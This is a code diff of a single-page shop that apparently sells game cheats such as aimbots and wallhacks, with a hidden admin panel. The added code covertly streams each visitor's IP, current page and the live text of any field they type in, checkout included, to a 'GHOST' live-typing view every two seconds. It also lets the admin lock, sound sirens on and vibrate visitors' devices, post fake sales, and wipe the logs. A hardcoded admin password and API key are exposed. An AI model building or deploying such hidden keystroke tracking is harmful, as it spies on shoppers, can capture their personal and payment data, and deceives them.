+                    <p style="color:yellow; margin:0 0 10px 0; font-size:12px; border-bottom:1px solid #222;">LIVE TYPING FEED:</p>
+                    <div id="t" style="color:white; font-size:18px; word-break: break-all; min-height:40px;">...</div>
+                </div>
+            </div>
+            <script>
+                const config = {
+                    apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
+                    authDomain: "maxiom-r3.firebaseapp.com",
+                    databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
+                    projectId: "maxiom-r3"
+                };
+                firebase.initializeApp(config);
+                const gDB = firebase.database();
+                
+                gDB.ref('.info/connected').on('value', s => {
+                    if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE";
+                });
+
+                gDB.ref('ghost_tracking/${targetID}').on('value', s => {
+                    const d = s.val();
+                    if(d) {
+                        document.getElementById('p').innerText = d.pageName || "BROWSING";
+                        document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
+                        document.getElementById('t').innerText = d.typing || "Not typing...";
+                    }
+                });
+            <\/script>
+        </body>
+        </html>
+    `);
+}
+
+function resetTarget() { chatTarget = "NONE"; document.getElementById('manual-target-id').value = ""; document.getElementById('active-target-display').innerText = "Target: User_Self"; document.getElementById('chat-title').innerText = "SECURE BRIDGE"; document.getElementById('chat-msgs').innerHTML = ""; }
+
+async function getIdentity() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        userIP = d.ip;
+        userID = userIP.split('.')[0];
+        db.ref('presence/' + userID).set(true);
+        db.ref('presence/' + userID).onDisconnect().remove();
+        if(!isAdmin) {
+            syncChat();
+            broadcastGhostData();
+        }
+    } catch(e) { console.log("Identity Error"); }
+}
+
+// ==========================================
+// FIXED GHOST BROADCASTER (HEARTBEAT)
+// ==========================================
+function broadcastGhostData() {
+    if(isAdmin || userID === "Unknown") return;
+    const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
+    const isInfo = document.getElementById('info-page').style.display !== 'none';
+    let currentPage = "MAIN SHOP";
+    if(isCheckout) currentPage = "CHECKOUT PAGE";
+    if(isInfo) currentPage = "PRODUCT INFO: " + (document.getElementById('info-title').innerText || "");
+    
+    let typingContent = "";
+    if(document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+        typingContent = document.activeElement.value;
+    }
+
+    db.ref(`ghost_tracking/${userID}`).update({
+        pageName: currentPage,
+        lastActive: Date.now(),
+        typing: typingContent || "Browsing..."
+    });
+}
+
+function toggleMusic(e) { 
+    if(e) e.stopPropagation();
+    let m = document.getElementById('hacker-music'), btn = document.getElementById('music-btn');
+    if (m.paused) { m.play(); btn.innerText = "🔊 MUSIC: ON"; } else { m.pause(); btn.innerText = "🔇 MUSIC: OFF"; }
+}
+
+function displayProducts() {
+    db.ref('products').on('value', (snap) => {
+        products = snap.val() || [];
+        const android = document.getElementById("android-grid"), ios = document.getElementById("ios-grid");
+        if(!android) return;
+        android.innerHTML = ""; ios.innerHTML = "";
+        products.forEach((p, i) => {
+            if(!p) return;
+            const div = document.createElement("div"); div.className = "product";
+            div.innerHTML = `<img src="${p.image || ''}" onclick="showInfo(${i})"><h3>${p.name}</h3><div style="color:var(--price-gold); font-weight:bold; font-size:20px;">$${p.price}</div><button onclick="addToCart(${i})" style="width:100%; background:var(--primary); margin-top:10px; border:none; padding:10px; cursor:pointer; font-weight:bold;">ADD TO CART</button>`;
+            p.category === "ios" ? ios.appendChild(div) : android.appendChild(div);
+        });
+        if(isAdmin) renderAdminAssets();
+    });
+}
+
+function addProduct() {
+    const n=document.getElementById('p-name').value, p=document.getElementById('p-price').value, y=document.getElementById('p-yt').value, c=document.getElementById('p-cat').value, d=document.getElementById('p-desc').value, fImg=document.getElementById('p-img').files[0], fFile=document.getElementById('p-file').files[0], idx=document.getElementById('edit-index').value;
+    if(!n || !p) return alert("NAME AND PRICE REQUIRED");
+    const read = (file) => file ? new Promise(res => { const r=new FileReader(); r.onload=e=>res({data:e.target.result, name:file.name}); r.readAsDataURL(file); }) : null;
+    Promise.all([read(fImg), read(fFile)]).then(vals => {
+        let existing = (idx != -1) ? products[idx] : {};
+        let obj = { name:n, price:p, yt:y, category:c, desc:d, image: vals[0] ? vals[0].data : (existing.image || ""), delivery: vals[1] ? vals[1] : (existing.delivery || null) };
+        if(idx == -1) products.push(obj); else products[idx] = obj;
+        db.ref('products').set(products).then(() => { alert(idx == -1 ? "ASSET DEPLOYED" : "ASSET UPDATED"); resetForge(); });
+    });
+}
+
+function renderAdminAssets() {
+    const list = document.getElementById('admin-asset-list');
+    if(!list) return;
+    list.innerHTML = products.map((p, i) => p ? `<div style="border-bottom:1px solid #222; padding:5px; display:flex; justify-content:space-between; align-items:center;"><span style="font-size:10px; color:white;">${p.name}</span><div><button onclick="editProduct(${i})" style="color:lime; background:none; border:1px solid lime; padding:2px; font-size:9px;">E</button><button onclick="deleteProduct(${i})" style="color:red; background:none; border:1px solid red; margin-left:2px; padding:2px; font-size:9px;">D</button></div></div>` : '').join('');
+}
+
+function editProduct(i) {
+    const p = products[i];
+    document.getElementById('p-name').value = p.name;
+    document.getElementById('p-price').value = p.price;
+    document.getElementById('p-yt').value = p.yt || '';
+    document.getElementById('p-cat').value = p.category;
+    document.getElementById('p-desc').value = p.desc;
+    document.getElementById('edit-index').value = i;
+    document.getElementById('forge-btn').innerText = "UPDATE";
+    document.getElementById('cancel-edit-btn').style.display = "block";
+}
+
+function deleteProduct(i) { if(confirm("DELETE ASSET?")) { products.splice(i, 1); db.ref('products').set(products); } }
+function resetForge() { document.getElementById('edit-index').value = "-1"; document.getElementById('forge-btn').innerText = "DEPLOY ASSET"; document.getElementById('cancel-edit-btn').style.display = "none"; document.getElementById('p-name').value = ""; document.getElementById('p-price').value = ""; document.getElementById('p-yt').value = ""; document.getElementById('p-desc').value = ""; }
+
+function addToCart(i) {
+    const sound = document.getElementById('snd-click');
+    sound.currentTime = 0; sound.play().catch(()=>{});
+    cart.push(products[i]);
+    updateCartCount();
+    db.ref('intel').push({ id: Date.now(), text: `VISIT | ${userIP} | ${products[i].name}`, owner: userIP.split('.')[0] });
+    broadcastGhostData();
+}
+
+function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
+function clearCart() { cart = []; updateCartCount(); renderCart(); }
+function removeFromCart(i) { cart.splice(i, 1); updateCartCount(); renderCart(); }
+function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
+
+function renderCart() {
+    let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
+    cart.forEach((item, index) => {
+        l.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; display:flex; justify-content:space-between;"><span>${item.name} - $${item.price}</span><button onclick="removeFromCart(${index})" style="background:none; border:none; color:red; cursor:pointer;">[REMOVE]</button></div>`;
+        t += parseFloat(item.price);
+    });
+    let final = t - (t * (discount/100));
+    document.getElementById('total-usd').innerText = "TOTAL: $" + final.toFixed(2);
+}
+
+function triggerHackerPay() {
+    if(cart.length === 0) return alert("INVENTORY EMPTY");
+    document.getElementById('auth-overlay').style.display = 'flex';
+    document.getElementById('paypal-button-container').innerHTML = '';
+    let t=0; cart.forEach(i=>t+=parseFloat(i.price));
+    let final = (t - (t * (discount/100))).toFixed(2);
+    paypal.Buttons({
+        createOrder: (data, actions) => actions.order.create({ purchase_units: [{ amount: { value: final } }] }),
+        onApprove: (data, actions) => actions.order.capture().then(det => {
+            cart.forEach(item => { if(item.delivery) { const a = document.createElement('a'); a.href = item.delivery.data; a.download = item.delivery.name; document.body.appendChild(a); a.click(); document.body.removeChild(a); } });
+            alert("SUCCESS."); cart = []; updateCartCount(); location.reload();
+        })
+    }).render('#paypal-button-container');
+}
+
 function login() {
     if(document.getElementById('admin-pass').value === "spartytop1") {
-        document.getElementById('admin-controls').style.display = 'block';
+        isAdmin = true;
+        document.getElementById('admin-controls').style.display = 'grid';
         document.getElementById('login-section').style.display = 'none';
-        db.ref('settings/wallets').once('value', s=>{
-            const w = s.val() || {};
-            document.getElementById('wallet-btc').value = w.btc || "";
-            document.getElementById('wallet-ltc').value = w.ltc || "";
-            document.getElementById('wallet-paypal').value = w.paypal || "";
+        
+        db.ref('intel').limitToLast(50).on('value', s => { 
+            const val = s.val() || {};
+            document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => {
+                let txt = val[k].text || "";
+                let extID = txt.includes('|') ? txt.split('|')[1].trim().split('.')[0] : "UNK";
+                return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
+                            <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
+                            <div style="display:flex; gap:5px; margin-top:3px;">
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">GHOST</button>
+                            </div>
+                        </div>`;
+            }).join(''); 
         });
+        db.ref('coupons').on('value', s => { coupons = s.val() || {}; });
+        renderAdminAssets();
     }
 }
-function saveWallets() {
-    db.ref('settings/wallets').set({ btc: document.getElementById('wallet-btc').value, ltc: document.getElementById('wallet-ltc').value, paypal: document.getElementById('wallet-paypal').value });
-    db.ref('settings/paypal_id').set(document.getElementById('wallet-paypal').value);
-    alert("SYSTEM UPDATED");
-}
-function addProduct() {
-    products.push({ name: document.getElementById('p-name').value, price: document.getElementById('p-price').value, category: document.getElementById('p-cat').value });
-    db.ref('products').set(products);
-}
-const canvas = document.getElementById('global-canvas'), ctx = canvas.getContext('2d');
-let drops = []; function initMatrix() { canvas.width=window.innerWidth; canvas.height=window.innerHeight; drops=Array(Math.floor(canvas.width/20)).fill(1); }
-function drawMatrix() { ctx.fillStyle="rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle="#ffd700"; drops.forEach((d,i)=>{ ctx.fillText(String.fromCharCode(Math.random()*128), i*20, d*20); if(d*20>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; }); }
-window.onload = () => {
-    initMatrix(); setInterval(drawMatrix, 50);
-    db.ref('products').on('value', s=>{
-        products = s.val() || []; const aG=document.getElementById("android-grid"), iG=document.getElementById("ios-grid");
-        aG.innerHTML = ""; iG.innerHTML = "";
-        products.forEach((p,i)=>{
-            const d=document.createElement("div"); d.className="product";
-            d.innerHTML=`<h3>${p.name}</h3><div class="price-display">$${p.price}</div><button class="ui-btn" onclick="cart.push(products[${i}]); document.getElementById('cart-count').innerText=cart.length">ADD TO CART</button>`;
-            p.category==="ios"?iG.appendChild(d):aG.appendChild(d);
-        });
+
+function banClientIP() { const ip = document.getElementById('ban-ip-input').value; if(ip) { db.ref('banned_ips').once('value', s => { let list = s.val() || []; list.push(ip); db.ref('banned_ips').set(list).then(() => alert("BLOCKED")); }); } }
+function addCoupon() { db.ref('coupons/'+document.getElementById('c-code').value.toUpperCase()).set(document.getElementById('c-perc').value).then(()=>alert("COUPON SAVED")); }
+
+function toggleKillSwitch() {
+    db.ref('settings/site_status').once('value', s => {
+        let status = s.val() === "LOCKED" ? "OPEN" : "LOCKED";
+        db.ref('settings/site_status').set(status);
+        alert("SITE STATUS: " + status);
     });
-    window.addEventListener('keydown', e=>{ if(e.key==="End") document.getElementById('admin-terminal').style.display='block'; });
-    let step=0, l=document.getElementById('load-logs');
-    let loop=setInterval(()=>{ if(step<7){
-        const msg = ["> INITIALIZING...", "> BYPASSING FIREWALL...", "> LOADING UI...", "> SYNCING DATABASE...", "> ENCRYPTING SESSION...", "> CORE READY...", "> ACCESS GRANTED"];
-        l.innerHTML+=`<div>${msg[step]}</div>`; document.getElementById('load-bar').style.width=(step+1)*14.2+"%"; step++;
-    } else { clearInterval(loop); document.getElementById('loader-overlay').style.display='none'; } }, 400);
+}
+
+function generateFakeSale() {
+    const items = ["Aimbot", "Wallhack", "Full Bundle", "iOS Bypass", "Android Root"];
+    const msg = `>>> SUCCESS: Anonymous_User_${Math.floor(Math.random()*999)} purchased [${items[Math.floor(Math.random()*items.length)]}]!`;
+    db.ref('settings/feed_text').set(msg);
+}
+
+function sendFlashBang() {
+    const msg = document.getElementById('alert-msg').value;
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!msg || !target || target === "" || target === "NONE") return alert("NO TARGET SELECTED");
+    db.ref(`private_chats/${target}/alert`).set({ msg: msg, time: Date.now() }).then(() => alert("FLASH-BANG DEPLOYED"));
+}
+
+function sendPower(type) {
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!target || target === "NONE") return alert("SELECT TARGET FIRST");
+    db.ref(`private_chats/${target}/power`).set({ type: type, time: Date.now() }).then(() => alert(type.toUpperCase() + " SENT"));
+}
+
+function vacuumDatabase() {
+    if(confirm("WIPE ALL LOGS?")) { db.ref('intel').set(null); db.ref('private_chats').set(null); db.ref('ghost_tracking').set(null); alert("PURIFIED"); }
+}
+
+function showInfo(i) {
+    const p = products[i];
+    document.getElementById('shop-page').style.display = 'none';
+    document.getElementById('info-page').style.display = 'block';
+    document.getElementById('info-img').src = p.image || '';
+    document.getElementById('info-title').innerText = p.name;
+    document.getElementById('info-price').innerText = "$" + p.price;
+    document.getElementById('info-desc').innerText = p.desc;
+    document.getElementById('info-btns').innerHTML = `<button class="ui-btn" onclick="addToCart(${i})" style="background:var(--primary); color:black;">ADD TO CART</button>${p.yt ? `<button class="ui-btn" onclick="window.open('https://youtube.com/watch?v=${p.yt}')" style="background:red; color:white;">📺 PREVIEW</button>` : ''}`;
+    broadcastGhostData();
+}
+
+function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; broadcastGhostData(); }
+function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); alert("APPLIED " + discount + "% DISCOUNT"); } else { alert("INVALID CODE"); } }
+
+const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--primary'); ctx.font = "15px monospace";
+    drops.forEach((y, i) => { ctx.fillText(String.fromCharCode(0x30A0 + Math.random()*33), i*20, y*20); if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; });
+}
+
+function updateMatrixSpeed(speed) { clearInterval(matrixInt); matrixInt = setInterval(drawMatrix, speed); }
+
+window.onload = () => {
+    getIdentity();
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    drops = Array(Math.floor(canvas.width/20)).fill(1);
+    matrixInt = setInterval(drawMatrix, 50);
+    displayProducts();
+    
+    db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });
+
+    db.ref('settings/site_status').on('value', s => {
+        if(s.val() === "LOCKED" && !isAdmin) {
+            document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>403: SYSTEM LOCKED</h1><p>Admin is performing maintenance.</p>";
+            window.stop();
+        }
+    });
+
+    db.ref(`private_chats/${userID}/alert`).on('value', s => {
+        if(s.val()) { alert("⚠️ ADMIN: " + s.val().msg); db.ref(`private_chats/${userID}/alert`).remove(); }
+    });
+
+    db.ref(`private_chats/${userID}/power`).on('value', s => {
+        const p = s.val();
+        if(!p) return;
+        try {
+            if(p.type === 'siren') { 
+                const sfx = document.getElementById('siren-sound');
+                sfx.volume = 1.0;
+                sfx.play().catch(() => { alert("⚠️ SYNCING SECURITY BRIDGE..."); sfx.play(); }); 
+            }
+            if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
+            if(p.type === 'lock') { 
+                document.getElementById('input-lock-overlay').style.display = 'block'; 
+                document.body.style.filter = 'grayscale(1) contrast(0.8)';
+            }
+            if(p.type === 'unlock') { 
+                document.getElementById('input-lock-overlay').style.display = 'none'; 
+                document.body.style.filter = 'none';
+            }
+        } catch(e) {}
+        setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
+    });
+
+    db.ref('settings/broadcast').on('value', s => {
+        const banner = document.getElementById('global-alert-banner');
+        if(s.val()) { banner.innerText = "⚠️ SYSTEM: " + s.val(); banner.style.display = 'block'; } else { banner.style.display = 'none'; }
+    });
+
+    db.ref('settings/feed_label').on('value', s => { document.getElementById('live-feed-label').innerText = s.val() || "LIVE_FEED"; });
+    db.ref('settings/feed_text').on('value', s => { document.getElementById('feed-text').innerText = s.val() || ">>> R4 FUSION SYSTEM STABLE :: ENCRYPTION ACTIVE..."; });
+
+    db.ref('settings/glitch_signal').on('value', s => {
+        if(!s.val()) return;
+        document.body.classList.add('glitching');
+        setTimeout(() => document.body.classList.remove('glitching'), 2000);
+    });
+
+    db.ref('settings/global_ui').on('value', s => {
+        const data = s.val();
+        if(data) {
+            if(data.primary_color) document.documentElement.style.setProperty('--primary', data.primary_color);
+            if(data.shop_title) document.getElementById('main-header-text').innerText = data.shop_title;
+            if(data.matrix_speed) updateMatrixSpeed(parseInt(data.matrix_speed));
+            if(data.glow_active === "on") document.body.classList.add('neon-glow'); else document.body.classList.remove('neon-glow');
+            if(data.font_choice) document.body.style.fontFamily = data.font_choice;
+        }
+    });
+
+    window.addEventListener('keydown', (e) => {
+        if(e.key === "End") { e.preventDefault(); document.getElementById('admin-terminal').style.display = 'block'; }
+        if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
+    });
+
+    // CRITICAL: UPDATED BROADCAST LISTENERS
+    window.addEventListener('mousedown', () => broadcastGhostData());
+    window.addEventListener('keyup', () => broadcastGhostData());
+    setInterval(broadcastGhostData, 2000); // AUTO-HEARTBEAT EVERY 2S
+
+    const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
+    let step = 0;
+    let loadInt = setInterval(() => {
+        if(step < lines.length) {
+            logs.innerHTML += `<div>${lines[step]}</div>`;
+            document.getElementById('load-bar').style.width = ((step+1)*33) + "%";
+            step++;
+        } else {
+            clearInterval(loadInt);
+            setTimeout(() => document.getElementById('loader-overlay').style.display='none', 800);
+        }
+    }, 600);
 };
-function startAudio() { document.getElementById('hacker-music').play().catch(()=>{}); }
+
+function triggerGlobalGlitch() { db.ref('settings/glitch_signal').set(Date.now()); }
+
+function applyGlobalChanges() {
+    const uiData = {
+        primary_color: document.getElementById('color-picker').value,
+        shop_title: document.getElementById('title-input').value,
+        matrix_speed: document.getElementById('ui-matrix-speed').value,
+        glow_active: document.getElementById('ui-glow').value,
+        font_choice: document.getElementById('ui-font').value
+    };
+    db.ref('settings/global_ui').set(uiData).then(() => {
+        document.getElementById('pgup-menu').style.display = 'none';
+        alert("GLOBAL UPDATE DEPLOYED");
+    });
+}
+
+function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
 </script>
 </body>
 </html>
+
